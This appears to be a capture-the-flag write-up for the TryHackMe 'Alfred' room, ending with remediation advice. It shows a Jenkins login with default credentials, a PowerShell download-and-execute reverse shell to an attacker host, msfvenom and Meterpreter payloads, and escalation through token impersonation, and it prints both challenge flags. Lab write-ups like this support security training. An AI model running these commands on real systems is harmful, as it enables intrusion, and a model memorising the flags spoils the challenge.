# Lab Report - Alfred


# Overview 
- **Category**: Web
- **Difficulty**: Easy
- **Platform**: Windows
- **Link**: https://tryhackme.com/room/alfred
- **Tags**: #shell #privesc  #jenkins

## Challenge Description 
>**- Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.**
## Resolution Summary 
>**We enumerated services with `Nmap`. Next we gained access to a Jenkins web application using common credentials. Shortly after, we found a project than was executed on a Windows machine, we were able to edit the project and execute malicious code to infiltrate the target. Finally, we elevated our privileges by impersonating higher-privileged tokens. We retrieved both user and root flags.** 

# Information Gathering 
- **As we were given an IP address, we started to scan the network for open ports using `Nmap`.**
- **Since the machine doesn't respond to ICMP packets, we will be using the `-Pn` option (it tells Nmap to skip the host discovery step entirely and treat all specified hosts as online):**
```bash
sudo nmap -sV -Pn 10.10.197.195
```

- **From the previous scan, we get the following results:**
```bash
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

- **We focused on investigating these services.** 
## HTTP (80)
- **Once we accessed the web application on port 80, we were greeted with a picture of Patric Bateman (Bruce Wayne) and an email address for donations `alfred@wayneenterprises.com`.** 
- **We started a Gobuster scan in order to find any hidden directory:** 
```bash
gobuster dir -u 10.10.197.195:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 64
```
	Note: It did not bear any result.

- **While the scan was running, we downloaded the picture from the web application and ran the following, hoping to find any information from the picture's metadata:**
```bash
exiftool bruce.jpg
```
	Note: It did not lead to anything.

- **At this point, here is the only useful data we gathered from this web application:**
	- An email address: `alfred@wayneenterprises.com`.
	- Potential usernames: `Bruce Wayne, Alfred`.  

## HTTP (8080)
- **There we came across a login page.** 
- **Just in case, we ran on the background the same GoBuster scan as before:** 
```bash
gobuster dir -u 10.10.197.195:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 64
```
	Note: It did not lead to anything.

- **Since we were facing a login page, we used Burp Suite to examine the login request. We found that there is a redirection upon trying to authenticate, even if the credentials were wrong (hence, we couldn't see the login error message when forwarding a request with Repeater).** 

- **We attempted some basic credentials combination, and we found a successful one:** 
	- **`admin:admin`**

# Exploitation 
## HTTP (8080)
- **Upon exploring the Jenkins interface, we found a project (scheduled) that run the `whoami` command, we immediately thought about some sort of command injection vulnerability.**
- **First, we uploaded a (reverse shell) Powershell script from [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)** 

- **Next we injected this code to be executed on the target:** 
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.139.102:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.139.102 -Port 4444
```

- **However, we could also try to set up a better shell with Meterpreter.** 
- **We started by creating the payload by using `msfvenom`:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.139.102 LPORT=4444 -f exe -o shell.exe
```

- **Next, we used Metasploit's  handler `multi/handler` to receive our reverse shell:** 
```bash
msfconsole
use /exploit/multi/handler
#We set all the required options + payload
run
```

- **And we injected this command on the Jenkins project:**
```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.139.102:8000/shell.exe','shell.exe')"

#After running the previous command, we injected this one to execute the payload

shell
```

- **Once we obtained a meterpreter shell, we used the following to access a Windows shell:** 
```cmd
shell
```

# Privilege Escalation 
- **Here we will be using token impersonation to gain system access.** 
- **In order to find privilege escalation vectors, we viewed the privileges held by our user's access token using the following:**
```cmd
whoami /priv
```

- **As a result, we found that `SeDebugPrivilege` and 'SeImpersonatePrivilege' are both enabled. Here, we will be exploiting the 'SeImpersonatePrivilege' privilege.**
- **Since 'SeImpersonatePrivilege' is enable, we can perform impersonation for available tokens. We will be using the `incognito` module to exploit this vulnerability.** 

- **First, we needed to drop back to our meterpreter shell:** 
```cmd
exit
```

- **Then , we loaded the `incognito` module on our meterpreter session:** 
```meterpreter
load incognito
```

- **Next, we checked the available tokens:** 
```meterpreter
list_tokens -g
```

- **Eventually, we found that the `BUILTIN\Administrators` token was available. We impersonated it by using the following command:** 
```meterpreter
impersonate_token "BUILTIN\Administrators"
```

- **However, since Windows uses the Primary Token (and not the impersonated one) to determine what the process can do or not, we need to ensure that we migrate to a process with the correct permissions.** 

- **To begin with , we can use the `getuid` command to confirm our privileges after impersonation:** 
```meterpreter
getuid 

NT AUTHORITY\SYSTEM
```

- **As the impersonation process is temporary and thread-scoped, we can try  and migrate to a process with the correct permissions (NT AUTHORITY\SYSTEM) which will allow our Meterpreter process to run with the stolen token more stably and persistently.**
- **We went with the following option `services.exe` (suggested by the THM), we could also target another process since this one is likely to be monitored in real-world context:**
```meterpreter 
ps
migrate 668
```

- **Finally, we used `shell` again to access a Windows shell and got the root.txt file.** 

# Trophy 
**User.txt → `79007a09481963edf2e1321abd9ae2a0`**  

**Root.txt → `dff0f748678f280250f25a45b8046b4a`**

# Remediation Summary
- **Avoid using weak/common credentials.**
- **Restrict job editing/configuration in Jenkins to authorized administrators; Require approval for changes from non-privileged users.**
- **Revoke or restrict privileges such as 'SeImpersonatePrivilege' or 'SeDebugPrivilege' from non-service (= not meant to run Windows services or system processes) accounts.** 

# Lessons Learned
- **Command injections in Jenkins projects**
- **Always try common credentials first (low hanging fruits)**
- **Using impersonation tokens**
- **Migrating to a service with the correct permissions to stabilize the shell after token impersonation**
